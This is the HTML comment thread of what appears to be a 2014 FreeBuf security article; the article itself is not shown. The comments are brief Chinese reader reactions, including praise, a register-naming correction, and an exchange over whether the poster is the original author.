<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70736" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70736" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70736" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70736" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70736" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-70734">
    <div id="comment-70734">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic11.png">     </div>
    <div class="tit"> 
	    <span class="name"> tedJoy_01<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70734','70734', 'respond','26441' ) " href="?replytocom=70734#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">20楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>回复:  大牛莫笑话我了，一大清早还不清醒…</p>
<div class="comment-tools">
<div class="vote" id="vote-70734"><span id="acv_stat_70734"></span><a class="ilike_icon"  id="vote4-70734" href="javascript:acv_vote(70734,1);">亮了</a>(<span id="cos_support-70734">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70734" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70734" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70734" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70734" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70734" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-70733">
    <div id="comment-70733">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic1.png">     </div>
    <div class="tit"> 
	    <span class="name"> 卖火柴的夜未央<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70733','70733', 'respond','26441' ) " href="?replytocom=70733#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">21楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>我也来转发一下</p>
<div class="comment-tools">
<div class="vote" id="vote-70733"><span id="acv_stat_70733"></span><a class="ilike_icon"  id="vote4-70733" href="javascript:acv_vote(70733,1);">亮了</a>(<span id="cos_support-70733">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70733" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70733" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70733" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70733" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70733" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-70732">
    <div id="comment-70732">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic7.png">     </div>
    <div class="tit"> 
	    <span class="name"> 卖火柴的夜未央<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-70732','70732', 'respond','26441' ) " href="?replytocom=70732#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">22楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>求技术细节//: shit！这不是我实现的吗？虽然漏洞不同，但思路跟我的一模一样，我是不是该说点什么？</p>
<div class="comment-tools">
<div class="vote" id="vote-70732"><span id="acv_stat_70732"></span><a class="ilike_icon"  id="vote4-70732" href="javascript:acv_vote(70732,1);">亮了</a>(<span id="cos_support-70732">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="70732" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="70732" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="70732" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="70732" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="70732" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-77295">
    <div id="comment-77295">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic11.png">     </div>
    <div class="tit"> 
	    <span class="name"> 卖火柴的夜未央<span class="weibo"></span> </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-77295','77295', 'respond','26441' ) " href="?replytocom=77295#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">23楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>求技术细节 shit！这不是我实现的吗？虽然漏洞不同，但思路跟我的一模一样，我是不是该说点什么？</p>
<div class="comment-tools">
<div class="vote" id="vote-77295"><span id="acv_stat_77295"></span><a class="ilike_icon"  id="vote4-77295" href="javascript:acv_vote(77295,1);">亮了</a>(<span id="cos_support-77295">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="77295" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="77295" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="77295" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="77295" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="77295" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-37465">
    <div id="comment-37465">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> xxoo </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37465','37465', 'respond','26441' ) " href="?replytocom=37465#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">24楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>作为一个不会汇编的人，我竟然一字不漏的看完了，还有点看懂了的感觉！！！！！</p>
<div class="comment-tools">
<div class="vote" id="vote-37465"><span id="acv_stat_37465"></span><a class="ilike_icon"  id="vote4-37465" href="javascript:acv_vote(37465,1);">亮了</a>(<span id="cos_support-37465">8</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37465" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37465" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37465" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37465" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37465" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-974439508 odd alt thread-even depth-1" id="li-comment-37475">
    <div id="comment-37475">
        <div class="photo"> <a href="http://www.freebuf.com/author/974439508">
    <img src="http://image.3001.net/2014/01/u24139234483326783796fm21gp0.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/974439508" target="_blank">974439508&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-19</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37475','37475', 'respond','26441' ) " href="?replytocom=37475#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">25楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>有突破。</p>
<div class="comment-tools">
<div class="vote" id="vote-37475"><span id="acv_stat_37475"></span><a class="ilike_icon"  id="vote4-37475" href="javascript:acv_vote(37475,1);">亮了</a>(<span id="cos_support-37475">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37475" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37475" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37475" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37475" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37475" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-37518">
    <div id="comment-37518">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic11.png">     </div>
    <div class="tit"> 
	    <span class="name"> fake </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37518','37518', 'respond','26441' ) " href="?replytocom=37518#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">26楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>&#8216;记录有可能的栈顶(ESP)和栈底(ESP)寄存器&#8217;    这段话有个错误</p>
<div class="comment-tools">
<div class="vote" id="vote-37518"><span id="acv_stat_37518"></span><a class="ilike_icon"  id="vote4-37518" href="javascript:acv_vote(37518,1);">亮了</a>(<span id="cos_support-37518">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37518" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37518" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37518" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37518" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37518" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-smonk odd alt thread-even depth-1" id="li-comment-37545">
    <div id="comment-37545">
        <div class="photo"> <a href="http://www.freebuf.com/author/smonk">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/smonk" target="_blank">smonk&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37545','37545', 'respond','26441' ) " href="?replytocom=37545#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">27楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>可以在百度混20w~100w年薪啦</p>
<div class="comment-tools">
<div class="vote" id="vote-37545"><span id="acv_stat_37545"></span><a class="ilike_icon"  id="vote4-37545" href="javascript:acv_vote(37545,1);">亮了</a>(<span id="cos_support-37545">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37545" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37545" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37545" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37545" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37545" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-37552">
    <div id="comment-37552">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic18.png">     </div>
    <div class="tit"> 
	    <span class="name"> 河蟹 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-20</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37552','37552', 'respond','26441' ) " href="?replytocom=37552#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">28楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>怎么在看雪看过？</p>
<div class="comment-tools">
<div class="vote" id="vote-37552"><span id="acv_stat_37552"></span><a class="ilike_icon"  id="vote4-37552" href="javascript:acv_vote(37552,1);">亮了</a>(<span id="cos_support-37552">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37552" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37552" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37552" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37552" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37552" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-yondwell odd alt thread-even depth-1" id="li-comment-37575">
    <div id="comment-37575">
        <div class="photo"> <a href="http://www.freebuf.com/author/yondwell">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/yondwell" target="_blank">yondwell&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37575','37575', 'respond','26441' ) " href="?replytocom=37575#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">29楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>太深奥，小白表示没看懂</p>
<div class="comment-tools">
<div class="vote" id="vote-37575"><span id="acv_stat_37575"></span><a class="ilike_icon"  id="vote4-37575" href="javascript:acv_vote(37575,1);">亮了</a>(<span id="cos_support-37575">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37575" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37575" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37575" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37575" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37575" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-evilworm even thread-odd thread-alt depth-1" id="li-comment-37595">
    <div id="comment-37595">
        <div class="photo"> <a href="http://www.freebuf.com/author/EvilWorm">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/EvilWorm" target="_blank">EvilWorm&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37595','37595', 'respond','26441' ) " href="?replytocom=37595#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">30楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>转仙果的就要说明,楼主不厚道哇,搞得像原创一样.</p>
<div class="comment-tools">
<div class="vote" id="vote-37595"><span id="acv_stat_37595"></span><a class="ilike_icon"  id="vote4-37595" href="javascript:acv_vote(37595,1);">亮了</a>(<span id="cos_support-37595">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37595" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37595" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37595" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37595" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37595" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-2" id="li-comment-37596">
    <div id="comment-37596">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic9.png">     </div>
    <div class="tit"> 
	    <span class="name"> 夜未央 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37596','37596', 'respond','26441' ) " href="?replytocom=37596#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@EvilWorm   我能说就是原创吗？</p>
<div class="comment-tools">
<div class="vote" id="vote-37596"><span id="acv_stat_37596"></span><a class="ilike_icon"  id="vote4-37596" href="javascript:acv_vote(37596,1);">亮了</a>(<span id="cos_support-37596">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37596" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37596" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37596" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37596" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37596" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-fallensec even depth-2" id="li-comment-37598">
    <div id="comment-37598">
        <div class="photo"> <a href="http://www.freebuf.com/author/FallenSec">
    <img src="http://image.3001.net/2013/10/logo_200.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/FallenSec" target="_blank">FallenSec&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 某学院在读疯狂学习的苦逼工科生 </span>
		<span class="time">&nbsp;2014-02-21</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37598','37598', 'respond','26441' ) " href="?replytocom=37598#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@EvilWorm   哈哈哈哈，楼主就是仙果&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-37598"><span id="acv_stat_37598"></span><a class="ilike_icon"  id="vote4-37598" href="javascript:acv_vote(37598,1);">亮了</a>(<span id="cos_support-37598">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37598" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37598" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37598" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37598" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37598" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-9708 odd alt depth-2" id="li-comment-37841">
    <div id="comment-37841">
        <div class="photo"> <a href="http://www.freebuf.com/author/余青木">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/余青木" target="_blank">余青木&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-26</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37841','37841', 'respond','26441' ) " href="?replytocom=37841#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@EvilWorm   开始我也想说，转仙果的需注明，后面发现夜未央就是仙果&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-37841"><span id="acv_stat_37841"></span><a class="ilike_icon"  id="vote4-37841" href="javascript:acv_vote(37841,1);">亮了</a>(<span id="cos_support-37841">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37841" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37841" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37841" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37841" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37841" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-evilworm even thread-even depth-1" id="li-comment-37606">
    <div id="comment-37606">
        <div class="photo"> <a href="http://www.freebuf.com/author/EvilWorm">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/EvilWorm" target="_blank">EvilWorm&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-22</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37606','37606', 'respond','26441' ) " href="?replytocom=37606#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">31楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>夜未央是仙果???  囧&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-37606"><span id="acv_stat_37606"></span><a class="ilike_icon"  id="vote4-37606" href="javascript:acv_vote(37606,1);">亮了</a>(<span id="cos_support-37606">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37606" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37606" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37606" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37606" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37606" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-jkjack odd alt thread-odd thread-alt depth-1" id="li-comment-37616">
    <div id="comment-37616">
        <div class="photo"> <a href="http://www.freebuf.com/author/jk或jack">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/jk或jack" target="_blank">jk或jack&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-02-22</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-37616','37616', 'respond','26441' ) " href="?replytocom=37616#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">32楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>不明觉厉 <img src='http://image.3001.net/images/index/smilies/icon_sad.gif' alt=':sad:' class='wp-smiley' /> </p>
<div class="comment-tools">
<div class="vote" id="vote-37616"><span id="acv_stat_37616"></span><a class="ilike_icon"  id="vote4-37616" href="javascript:acv_vote(37616,1);">亮了</a>(<span id="cos_support-37616">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="37616" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="37616" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="37616" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="37616" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="37616" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-wn7ll even thread-even depth-1" id="li-comment-38063">
    <div id="comment-38063">
        <div class="photo"> <a href="http://www.freebuf.com/author/w@n7@ll">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/w@n7@ll" target="_blank">w@n7@ll&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2014-03-04</span>
		<span class="time">
                    </span>
